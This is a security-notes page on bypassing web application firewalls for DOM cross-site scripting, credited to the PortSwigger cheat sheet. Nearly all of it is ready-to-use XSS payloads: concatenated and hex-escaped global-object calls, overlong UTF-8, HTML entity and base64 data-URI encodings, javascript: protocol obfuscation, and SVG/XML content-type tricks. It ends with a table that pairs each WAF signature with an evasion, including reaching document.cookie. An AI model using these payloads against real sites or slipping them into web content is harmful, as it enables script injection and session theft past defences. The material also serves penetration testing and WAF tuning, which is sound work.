---
title: DOM XSS — WAF Bypass and Obfuscation
slug: waf-bypass
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/waf-bypass]
inbound: []
---

# DOM XSS — WAF Bypass and Obfuscation

## Pattern

WAFs typically signature-match on known dangerous strings (`alert`, `eval`, `document.cookie`, `<script`, `onerror=`, etc.). Bypass techniques include: string concatenation with global object bracket notation (`window['ale'+'rt']`), comment insertion, hex escape sequences, base64 data URIs, HTML entity encoding in specific attribute contexts, overlong UTF-8 sequences, and JavaScript unicode/hex escapes. The cheat sheet's "WAF bypass global objects" section covers the JS string context; "Encoding", "Obfuscation", "Protocols", and "Special tags" sections cover HTML/URL contexts.

## Preconditions

- Injection reaches a context where a WAF inspects the payload.
- Target browser supports the encoding/bypass being used.
- For JS string context: injection is inside a `<script>` block, `javascript:` URI, or event handler value.
- For HTML context: injection reaches `innerHTML`/`outerHTML`/`document.write`.

## Detection

- Oracle: inject `alert(1)` — if blocked, try encoded variants.
- Differential testing: send to burp intruder with encoding mutations; look for 200 vs 403/redirect.
- `js_analyzer` + WAF fingerprinting: some WAFs respond with a distinct header or body on block.

## Triggering

### JS string context — global object bypass

```javascript
// String concatenation via window
';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//

// self / this / top / parent / frames / globalThis
';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//
';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//
';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//

// Comment syntax obfuscation
';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//

// Hex escape sequences
';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//

// Hex escape + base64
';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//
```

### Encoding bypasses (HTML attribute / URL contexts)

```html
<!-- Overlong UTF-8 (tag open bypass) -->
%C0%BCscript>alert(1)</script>
%E0%80%BCscript>alert(1)</script>
%F0%80%80%BCscript>alert(1)</script>

<!-- Unicode escapes in JS -->
<script>alert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>

<!-- Hex and octal in JS eval -->
<script>eval('\x61lert(1)')</script>
<script>eval('\141lert(1)')</script>
<script>eval('alert(\061)')</script>

<!-- Decimal HTML entity in href (with/without semicolon) -->
<a href="&#106;avascript:alert(1)">XSS</a>
<a href="&#106avascript:alert(1)">XSS</a>

<!-- SVG script HTML entity encoding -->
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>

<!-- Decimal entities with zero padding -->
<a href="&#0000106avascript:alert(1)">XSS</a>

<!-- Hex entities -->
<a href="&#x6a;avascript:alert(1)">XSS</a>
<a href="j&#x61vascript:alert(1)">XSS</a>
<a href="&#x0000006a;avascript:alert(1)">XSS</a>
<a href="&#X6A;avascript:alert(1)">XSS</a>

<!-- Named HTML entities in protocol -->
<a href="javascript&colon;alert(1)">XSS</a>
<a href="java&Tab;script:alert(1)">XSS</a>
<a href="java&NewLine;script:alert(1)">XSS</a>
<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>

<!-- URL encoding -->
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
```

### Obfuscation (script src, iframe, img)

```html
<!-- Base64 data URI in script src -->
<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>

<!-- Base64 + HTML entities -->
<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>

<!-- Base64 + URL encoding -->
<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>

<!-- iframe srcdoc HTML encoded -->
<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>

<!-- iframe JS URL with double encoding -->
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>

<!-- SVG with unicode + HTML entity compound obfuscation -->
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>

<!-- img src atob with template literal base64 -->
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
```

### Protocol obfuscation (javascript: bypass)

```html
<!-- Case insensitive -->
<a href="JaVaScript:alert(1)">XSS</a>

<!-- Whitespace chars \x01-\x20 before protocol -->
<a href=" 	javascript:alert(1)">XSS</a>

<!-- \x09 \x0a \x0d inside protocol name -->
<a href="javas	cript:alert(1)">XSS</a>

<!-- Newline between protocol and colon -->
<a href="javascript
:alert(1)">XSS</a>

<!-- data: URI in script src -->
<script src="data:text/javascript,alert(1)"></script>

<!-- import() with data URL -->
<script>import('data:text/javascript,alert(1)')</script>

<!-- navigation.navigate -->
<script>navigation.navigate('javascript:alert(1)')</script>
```

### Special content-type XSS

```html
<!-- SVG via image/svg+xml response -->
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>

<!-- application/xml, text/xml, application/xhtml+xml -->
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>

<!-- UTF-7 meta charset (legacy IE/legacy parsers) -->
<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

## Bypasses

| WAF Signature | Bypass Method |
|---|---|
| Block `alert` literal | `window['ale'+'rt']`, hex `\x61\x6c\x65\x72\x74`, base64 atob |
| Block `<script` | `<svg>`, `<img onerror>`, `<iframe>`, base64 data URI |
| Block `javascript:` | Case variant `JaVaScript:`, whitespace prefix, tab inside name |
| Block `onerror=` | Use other event handlers (animation, media events) |
| Block `eval` | `window['\x65\x76\x61\x6c']`, `Function`, `setTimeout(str)` |
| Block `document.cookie` | `window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x63\x6f\x6f\x6b\x69\x65']` |
| Normalise HTML entities before check | Double-encode; try URL+HTML hybrid encoding |
| Check Content-Type nosniff | Use `image/svg+xml`, `application/xml`, `text/vtt`, `text/cache-manifest` |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed., WAF bypass global objects + Encoding + Obfuscation + Protocols + Content types sections)
